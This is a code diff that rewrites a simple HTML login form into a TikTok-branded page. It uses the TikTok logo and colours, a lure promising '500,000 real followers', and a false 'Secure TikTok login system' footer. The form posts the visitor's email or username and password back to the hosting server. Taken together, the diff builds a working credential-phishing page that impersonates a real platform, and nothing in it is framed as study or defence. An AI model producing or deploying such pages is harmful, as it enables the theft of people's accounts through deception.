@@ -1,14 +1,82 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Login Form</title>
+  <meta charset="UTF-8">
+  <title>TikTok Login</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #000;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 80px;
+    }
+    h2 {
+      text-align: center;
+      color: white;
+      margin-bottom: 30px;
+    }
+    .form-box {
+      background-color: #111;
+      padding: 30px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 0 10px rgba(255, 0, 100, 0.3);
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #f02c56;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #d01c46;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #aaa;
+      text-align: center;
+    }
+  </style>
 </head>
 <body>
-    <h2>Login</h2>
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/TikTok_Logo.svg" alt="TikTok Logo">
+  </div>
+  <h2>Login now to get <strong>500,000 real followers</strong> for your TikTok account!</h2>
+  <div class="form-box">
     <form method="POST">
-        <input type="text" name="username" placeholder="Username" required><br><br>
-        <input type="password" name="password" placeholder="Password" required><br><br>
-        <button type="submit">Log In</button>
+      <input type="text" name="username" placeholder="Email or Username" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Login</button>
     </form>
+  </div>
+  <div class="footer">
+    Secure TikTok login system. All rights reserved.
+  </div>
 </body>
 </html>
